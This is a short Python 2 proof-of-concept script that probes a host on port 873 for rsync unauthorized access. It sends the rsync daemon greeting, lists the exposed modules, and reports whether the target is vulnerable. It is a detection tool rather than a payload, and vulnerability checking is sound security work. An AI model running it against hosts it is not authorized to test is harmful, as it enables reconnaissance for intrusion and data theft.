#!/usr/bin/env python
# -*- coding:utf-8 -*-
# 漏洞名: Rsync未授权访问漏洞
# 受影响版本:All
# 编写时间: 2016年5月30日
# 编写人:CF_HB

import socket
import traceback
import time
import argparse


class RsyncPOC():
    def __init__(self, ):
        self.port = 873
        self.poc = "\x40\x52\x53\x59\x4e\x43\x44\x3a\x20\x33\x31\x2e\x30\x0a"
    def connectsocket(self):
        try:
            socket.setdefaulttimeout(15)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_address = (self.host, int(self.port))
            sock.connect(server_address)
            return sock
        except Exception, e:
            traceback.print_exc()
            print "Failed to connection target"
            exit(0)
    def verity(self, host,port):
        self.host = host
        self.port = port
        try:
            sock = self.connectsocket()
            # client init.
            sock.sendall(self.poc)
            time.sleep(2)
            # server init.
            initinfo = sock.recv(400)
            if "RSYNCD" in initinfo:
                sock.sendall("\x0a")
                time.sleep(2)
            modulelist = sock.recv(200)
            sock.close()
            if len(modulelist)>0:
                print "{host}#{port} is vulnerable.."
        except Exception,e:
            print "This Target is not vulnerable"
            exit(0)

if __name__ == '__main__':
    rsynpoc = RsyncPOC()
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', help='target ip..')
    parser.add_argument('-p', help='target port..')
    args = parser.parse_args()
    args_dict = args.__dict__

    try:
        if not (args_dict['t'] == None):
            target = args_dict['t']
        if not (args_dict['p'] == None):
            port = args_dict['p']

        rsynpoc.verity(target, port)
    except Exception,e:
        print parser.print_usage()
        exit(-1)
